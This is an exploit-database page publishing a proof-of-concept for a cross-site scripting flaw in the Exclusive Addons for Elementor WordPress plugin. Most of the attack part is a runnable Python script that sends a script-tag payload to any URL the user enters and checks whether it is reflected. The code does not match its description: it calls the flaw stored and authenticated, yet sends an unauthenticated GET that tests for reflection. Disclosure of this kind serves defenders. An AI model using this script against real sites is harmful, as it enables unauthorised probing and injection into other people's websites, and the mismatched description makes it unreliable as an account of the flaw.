---
title: Exclusive Addons for Elementor 2.6.9 Stored Cross-Site Scripting
url: https://cxsecurity.com/issue/WLB-2025040012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-07
fetch_date: 2025-10-06T22:03:33.707248
---

# Exclusive Addons for Elementor 2.6.9 Stored Cross-Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Exclusive Addons for Elementor 2.6.9 Stored Cross-Site Scripting** **2025.04.06**  Credit:  **[Wordfence Security Team](https://cxsecurity.com/author/Wordfence%2BSecurity%2BTeam/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-1234](https://cxsecurity.com/cveshow/CVE-2024-1234/ "Click to see CVE-2024-1234")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Exclusive Addons for Elementor ≤ 2.6.9 - Authenticated Stored Cross-Site Scripting (XSS)
# Original Author: Wordfence Security Team
# Exploit Author: Al Baradi Joy
# Exploit Date: March 13, 2024
# Vendor Homepage: https://exclusiveaddons.com/
# Software Link: https://wordpress.org/plugins/exclusive-addons-for-elementor/
# Version: Up to and including 2.6.9
# Tested Versions: 2.6.9
# CVE ID: CVE-2024-1234
# Vulnerability Type: Stored Cross-Site Scripting (XSS)
# Description:
The Exclusive Addons for Exclusive Addons for Elementor for WordPress, in versions up to
and including 2.6.9, is vulnerable to stored cross-site scripting (XSS) via
the 's' parameter. Due to improper input sanitization and output escaping,
an attacker with contributor-level permissions or higher can inject
arbitrary JavaScript that executes when a user views the affected page.
# Proof of Concept: Yes
# Categories: Web Application, Cross-Site Scripting (XSS), WordPress Plugin
# CVSS Score: 6.5 (Medium)
# CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
# Notes:
To exploit this vulnerability, an attacker needs an authenticated user role
with permission to edit posts. Injecting malicious JavaScript can lead to
session hijacking, redirections, and other client-side attacks.
## Exploit Code:
```python
import requests
from urllib.parse import urlparse
# Banner
def display\_banner():
exploit\_title = "CVE-2024-1234: Exclusive Addons for Elementor Plugin
Stored XSS"
print("="\*50)
print(f"Exploit Title: {exploit\_title}")
print("Made By Al Baradi Joy")
print("="\*50)
# Function to validate URL
def validate\_url(url):
# Check if the URL is valid and well-formed
parsed\_url = urlparse(url)
if not parsed\_url.scheme in ["http", "https"]:
print("Error: Invalid URL. Please ensure the URL starts with http://
or https://")
return False
return True
# Function to exploit XSS vulnerability
def exploit\_xss(target\_url):
# The XSS payload to inject
payload = "<script>alert('XSS Exploit')</script>"
# The parameters to be passed (in this case, we are exploiting the 's'
parameter)
params = {
's': payload
}
# Send a GET request to the vulnerable URL with the payload
try:
print(f"Sending exploit to: {target\_url}")
response = requests.get(target\_url, params=params, timeout=10)
# Check if the status code is OK and if the payload is reflected in
the response
if response.status\_code == 200 and payload in response.text:
print(f"XSS exploit successful! Payload: {payload}")
elif response.status\_code != 200:
print(f"Error: Received non-OK status code
{response.status\_code}")
else:
print("Exploit failed or no XSS reflected.")
except requests.exceptions.RequestException as e:
print(f"Error: Request failed - {e}")
except Exception as e:
print(f"Unexpected error: {e}")
if \_\_name\_\_ == "\_\_main\_\_":
# Display banner
display\_banner()
# Ask the user for the target URL
target\_url = input("Enter the target URL: ").strip()
# Validate the provided URL
if validate\_url(target\_url):
# Call the exploit function if URL is valid
exploit\_xss(target\_url)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top